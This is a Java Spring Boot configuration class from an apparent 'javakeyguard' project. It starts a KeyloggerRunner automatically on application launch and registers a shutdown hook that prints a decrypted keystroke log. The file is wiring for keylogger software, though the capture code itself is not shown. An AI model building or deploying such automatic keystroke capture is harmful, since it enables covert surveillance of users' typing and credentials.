package com.keyguard.javakeyguard.config;

import com.keyguard.javakeyguard.keylogger.KeyloggerRunner;
import org.springframework.boot.CommandLineRunner;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class StartupConfig {

    @Bean
    public KeyloggerRunner keyloggerRunner() {
        return new KeyloggerRunner();
    }

    @Bean
    public CommandLineRunner runKeylogger(KeyloggerRunner keyloggerRunner) {
        return args -> keyloggerRunner.start();
    }

    @Bean
    public CommandLineRunner registerShutdownHook(KeyloggerRunner keyloggerRunner) {
        return args -> Runtime.getRuntime()
                .addShutdownHook(new Thread(keyloggerRunner::printFinalDecryptedLog));
    }
}